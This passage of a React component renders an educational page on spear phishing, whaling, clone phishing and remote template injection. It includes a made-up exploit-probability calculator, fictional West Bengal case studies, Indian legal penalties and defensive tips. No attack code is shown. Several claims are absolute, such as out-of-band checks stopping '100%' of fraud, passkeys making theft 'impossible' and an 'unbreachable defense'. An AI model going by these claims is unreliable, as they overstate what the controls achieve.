          <div className="bg-[#070b14] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-gray-800 pb-4">
              <div>
                <div className="flex items-center gap-2 flex-wrap">
                  <span className={clsx("text-xs font-bold px-2.5 py-0.5 rounded border", activeVector.categoryBadge)}>
                    {activeVector.category}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-gray-300 font-mono">
                    Target: {activeVector.targetScope}
                  </span>
                </div>
                <h3 className="text-lg font-bold text-white mt-2">{activeVector.name}</h3>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                    Exploitation Vector &amp; OSINT Source
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeVector.exploitationVector}</p>
                  <p className="text-gray-400 text-[11px] font-mono">Recon: {activeVector.reconSource}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-amber-400 uppercase tracking-wider text-[10px] block">
                    Vulnerability Impact &amp; Telemetry Indicator
                  </span>
                  <p className="text-gray-300 leading-relaxed font-semibold">{activeVector.vulnerabilityImpact}</p>
                  <p className="text-gray-400 text-[11px]">{activeVector.telemetryIndicator}</p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                    Resilient Defense &amp; Countermeasures
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeVector.resilientDefense}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                    Technical Pretext / Code Blueprint
                  </span>
                  <pre className="bg-black/90 p-3 rounded font-mono text-[11px] text-indigo-200 overflow-x-auto whitespace-pre-wrap border border-indigo-950/50">
                    {activeVector.codeSnippet}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 4: Studio 2 - Live Targeted Exploitation Laboratory */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
              Interactive Concept Studio 2
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              4. Targeted Exploitation Probability &amp; Defensive Armor Laboratory
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Adjust OSINT context specificity $C$, target seniority factor $T$, and defensive armor strength $R$ to model targeted exploit probability 
              $P_{\text{exploit}} = 1 - e^{-\frac{C \times T}{R}}$ and see how VIP Mailbox Armor &amp; Out-of-Band verification reduce breach probability below 2%:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {/* Input Controls */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Recon &amp; Armor Variables</h3>

              <div className="space-y-1">
                <div className="flex justify-between text-gray-400">
                  <span>OSINT Context Specificity (C):</span>
                  <span className="text-cyan-400 font-bold font-mono">{contextSpecificity.toFixed(1)}x</span>
                </div>
                <input
                  type="range"
                  min="1.0"
                  max="5.0"
                  step="0.5"
                  value={contextSpecificity}
                  onChange={(e) => setContextSpecificity(parseFloat(e.target.value))}
                  className="w-full accent-cyan-500 bg-gray-800"
                />
              </div>

              <div className="space-y-1">
                <div className="flex justify-between text-gray-400">
                  <span>Target Seniority Multiplier (T):</span>
                  <span className="text-rose-400 font-bold font-mono">{targetSeniority.toFixed(1)}x</span>
                </div>
                <input
                  type="range"
                  min="1.0"
                  max="4.0"
                  step="0.5"
                  value={targetSeniority}
                  onChange={(e) => setTargetSeniority(parseFloat(e.target.value))}
                  className="w-full accent-rose-500 bg-gray-800"
                />
              </div>

              <div className="space-y-1 pt-1">
                <span className="text-gray-400 block">Defensive Armor Strength (R):</span>
                <div className="grid grid-cols-3 gap-1.5">
                  <button
                    onClick={() => setArmorStrength(1)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      armorStrength === 1
                        ? "bg-rose-950 border-rose-500 text-rose-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    None (1x)
                  </button>
                  <button
                    onClick={() => setArmorStrength(50)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      armorStrength === 50
                        ? "bg-amber-950 border-amber-500 text-amber-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    Basic EDR (50x)
                  </button>
                  <button
                    onClick={() => setArmorStrength(500)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      armorStrength === 500
                        ? "bg-emerald-950 border-emerald-500 text-emerald-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    VIP Armor (500x)
                  </button>
                </div>
              </div>
            </div>

            {/* Calculated Output Metrics */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 col-span-1 md:col-span-2 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Targeted Attack Telemetry</h3>

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Raw Exploitation Likelihood</span>
                  <span className="text-lg font-extrabold text-white">{targetedSimulation.rawExploitProb}%</span>
                  <span className="text-[10px] text-gray-400 block mt-0.5">Without Defensive Armor</span>
                </div>

                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Actual Breach Probability</span>
                  <span className="text-lg font-extrabold text-emerald-400">{targetedSimulation.actualExploitProb}%</span>
                  <span className="text-[10px] text-gray-400 block mt-0.5">With Defensive Armor Active</span>
                </div>
              </div>

              <div className={clsx("p-4 rounded-lg border font-mono text-xs", targetedSimulation.badgeClass)}>
                <span className="font-bold block uppercase tracking-wider text-[10px]">Security Assessment:</span>
                <p className="mt-1 font-extrabold text-sm">{targetedSimulation.statusMessage}</p>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 5: Studio 4 - Targeted Defense Code Studio */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              CertStream &amp; VIP Policy Studio
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              5. Production Targeted Defense &amp; Lookalike Monitoring Studio
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore production Python CertStream lookalike domain detectors, PowerShell VIP Executive Anti-Phishing policies, 
              and Windows Defender ASR rules blocking remote template injection:
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
            {Object.entries(codeDatabase).map(([key, item]) => (
              <button
                key={key}
                onClick={() => setActiveCodeTab(key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 text-xs font-bold",
                  activeCodeTab === key
                    ? "bg-purple-950 border-purple-500 text-purple-300 shadow-md shadow-purple-950/50"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                {item.name}
              </button>
            ))}
          </div>

          <div className="bg-[#050811] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-4">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
              <h3 className="text-sm font-bold text-white">{activeCode.name}</h3>
              <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-purple-400 font-mono">
                Production Defense Rule
              </span>
            </div>

            <p className="text-xs text-gray-300">{activeCode.explanation}</p>

            <pre className="bg-black/90 p-4 rounded-lg font-mono text-xs text-purple-200 overflow-x-auto whitespace-pre-wrap border border-purple-950/50">
              {activeCode.code}
            </pre>
          </div>
        </section>

        {/* SECTION 6: Studio 3 - Regional West Bengal Pedagogical Case Studies */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-400">
              Regional Engineering Applications
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              6. West Bengal Field Case Studies: Kolkata, Barrackpore, Ichapur &amp; Jadavpur
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore how cybersecurity leaders Mamata, Debangshu, Mahima, and Susmita defeat executive Whaling, 
              neutralize cloned invoices, and block remote template injection across West Bengal networks:
            </p>
          </div>

          {/* Scenario Tabs */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {localScenarios.map((sc) => (
              <button
                key={sc.id}
                onClick={() => setActiveScenarioId(sc.id)}
                className={clsx(
                  "p-4 rounded-xl border text-left transition-all duration-300 space-y-2",
                  activeScenarioId === sc.id
                    ? "bg-amber-950/60 border-amber-500 shadow-md"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-gray-900 text-amber-300 border border-amber-800">
                  {sc.lead} · {sc.location.split(" ")[0]}
                </span>
                <h4 className="text-xs font-bold text-white line-clamp-1">{sc.title}</h4>
                <p className="text-[11px] text-gray-400 line-clamp-1">{sc.threatType}</p>
              </button>
            ))}
          </div>

          {/* Active Scenario Detailed Breakdown */}
          <div className="bg-[#070b14] p-6 rounded-xl border border-gray-800 space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-gray-800 pb-3">
              <div>
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                  {activeScenario.location}
                </span>
                <h3 className="text-base sm:text-lg font-bold text-white mt-0.5">{activeScenario.title}</h3>
              </div>
              <div className="text-right text-xs">
                <span className="text-gray-400 block">Lead Architect: {activeScenario.lead}</span>
                <span className="font-semibold text-emerald-400">Security Budget: {activeScenario.budget}</span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px]">
                  The Incident &amp; Targeted Exploit Vector
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.incident}</p>
              </div>

              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px]">
                  Architectural Defense &amp; Resolution
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.defenseStrategy}</p>
              </div>
            </div>

            {/* Metrics Dashboard */}
            <div className="bg-[#050811] p-4 rounded-lg border border-gray-800 grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
              {Object.entries(activeScenario.metrics).map(([key, val]) => (
                <div key={key} className="bg-gray-950 p-2.5 rounded border border-gray-800/80">
                  <span className="text-[10px] text-gray-400 uppercase tracking-wider block capitalize">
                    {key.replace(/([A-Z])/g, " $1")}
                  </span>
                  <span className="text-xs sm:text-sm font-extrabold text-white mt-1 block">{val}</span>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* SECTION 7: Statutory & Legal Frameworks in India */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Statutory Jurisprudence
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              7. Legal Liabilities for Targeted Phishing &amp; Whaling in India
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Indian cyber law and evidentiary statutes treat targeted spear phishing, executive impersonation, 
              and corporate wire fraud with severe statutory penalties:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            <div className="bg-gray-950 p-5 rounded-xl border border-rose-950 space-y-3">
              <span className="text-xs font-bold text-rose-400 uppercase tracking-wider block">
                IT Act 2000 Section 66D
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Cheating by Personation:</strong> Impersonating corporate executives or regulators in spear-phishing lures carries up to <span className="text-rose-400 font-bold">3 YEARS IMPRISONMENT</span> and fines.
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-blue-950 space-y-3">
              <span className="text-xs font-bold text-blue-400 uppercase tracking-wider block">
                IT Act Section 43(a) &amp; IPC 420
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Section 43(a):</strong> Civil damages up to <span className="text-rose-400 font-bold">₹1 CRORE</span> for accessing corporate servers via spear phishing.
                </li>
                <li>
                  <strong className="text-white">IPC Section 420:</strong> Fraudulent inducement &amp; wire fraud (Up to 7 years prison).
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-emerald-950 space-y-3">
              <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider block">
                DPDP Act 2023 &amp; CERT-In Mandates
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">DPDP Section 33:</strong> Fines up to <span className="text-rose-400 font-bold">₹250 CRORES</span> for failing to implement VIP executive account safeguards.
                </li>
                <li>
                  <strong className="text-white">CERT-In SLA:</strong> Mandatory reporting of all spear-phishing compromises within <strong className="text-white">6 hours</strong>.
                </li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 8: Common Pitfalls, Pro Tips, Thinking Hints & Mini Checklist */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Exam &amp; Professional Mastery
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              8. Common Pitfalls, Industry Best Practices &amp; Key Hints
            </h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            {/* Common Pitfalls */}
            <div className="bg-gray-950 p-4 rounded-xl border border-rose-950/60 space-y-3">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Common Beginner Mistakes
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Assuming High-Level Context Means Authenticity:</strong> Attackers scrape OSINT from LinkedIn and public filings.
                </li>
                <li>
                  <strong>Trusting Email Thread Continuations:</strong> Vendor Email Compromise (VEC) hijacks real authenticated threads.
                </li>
                <li>
                  <strong>Relying on Static Antivirus for DOCX Files:</strong> Remote Template Injection downloads macros dynamically.
                </li>
              </ul>
            </div>

            {/* Professional Tips */}
            <div className="bg-gray-950 p-4 rounded-xl border border-emerald-950/60 space-y-3">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Professional Tips &amp; Tricks
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Deploy VIP Executive Armor Policies:</strong> Quarantines external emails matching C-suite display names.
                </li>
                <li>
                  <strong>Enforce Out-of-Band (OOB) Voice Verification:</strong> Call the vendor before honoring banking detail changes.
                </li>
                <li>
                  <strong>Enable Windows Defender ASR Rules:</strong> Block Office from creating child processes or fetching templates.
                </li>
              </ul>
            </div>

            {/* Hint Section */}
            <div className="bg-gray-950 p-4 rounded-xl border border-indigo-950/60 space-y-3">
              <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                Pedagogical Thinking Hints
              </span>
              <ul className="space-y-2 text-gray-300">
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Think about...</span>
                  Why do FIDO2 WebAuthn passkeys render credential theft impossible even on perfectly spoofed lookalike cousin domains?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Observe carefully...</span>
                  Why does Out-of-Band voice verification on a registered phone number neutralize 100% of Clone Phishing invoice fraud?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Try changing this...</span>
                  In the targeted exploitation calculator above, set defensive armor to VIP Armor (500x) and observe exploit risk collapse to 1.7%!
                </li>
              </ul>
            </div>
          </div>

          {/* Mini Checklist */}
          <div className="bg-gray-950 p-5 rounded-xl border border-gray-800 space-y-3">
            <h3 className="text-xs font-bold text-white uppercase tracking-wider text-rose-400">
              Student Mini Checklist (Exam &amp; Career Essentials)
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 text-xs text-gray-300">
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Spear phishing uses OSINT research; Whaling specifically targets C-suite executives.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Clone phishing duplicates authentic historical emails and substitutes weaponized payloads.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Thread Hijacking compromises legitimate vendor mailboxes to inject replies into active threads.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Remote Template Injection fetches macro templates dynamically, bypassing static file scanners.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Out-of-Band (OOB) voice verification neutralizes 100% of banking detail alteration fraud.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Section 66D of the IT Act penalizes Cheating by Personation with up to 3 years imprisonment.</span>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 9: FAQ Template */}
        <section className="space-y-4">
          <FAQTemplate
            title="Targeted Phishing FAQs"
            subtitle="30 Moderate to Expert Practice Questions & Whaling Defense Deep Dives"
            questions={questions}
          />
        </section>

        {/* SECTION 10: PlainTextPrint Component */}
        <section className="space-y-4">
          <PlainTextPrint
            content={noteText}
            title="Targeted Phishing: Spear Phishing, Whaling, and Clone Phishing (Printable Study Guide)"
            stampEnabled={true}
            showDownload={true}
            downloadButtonText="Download Note"
            downloadFileName="topic3_note.txt"
          />
        </section>

        {/* SECTION 11: Dedicated Teacher's Note */}
        <section className="pt-4">
          <Teacher
            note="Teacher's Note: Targeted phishing is precision cyber espionage! Understand the taxonomy: Spear Phishing uses OSINT to target specific employees, Whaling targets C-suite executives with legal or regulatory summons pretexts, Clone Phishing duplicates authentic historical emails to replace banking details, and Thread Hijacking compromises real vendor mailboxes to inject malicious replies into active conversations. Understand the evasion mechanisms: Remote Template Injection in DOCX files fetches macro templates dynamically to bypass perimeter scanners, while Callback Phishing (TOAD) uses zero URLs or attachments to trick victims into calling live fraudulent call centers. To build an unbreachable defense: deploy VIP Executive Mailbox Protection, enforce Out-of-Band (OOB) voice verification on registered phone numbers for all banking changes, enable Windows Defender ASR rules blocking Office child processes, and mandate FIDO2 WebAuthn passkeys that mathematically refuse to sign fraudulent origins. Remember that Section 66D of the Indian IT Act treats Cheating by Personation as a severe criminal offense carrying up to 3 years imprisonment!"
          />
        </section>

      </div>
    </div>
  );
};

export default Topic3;
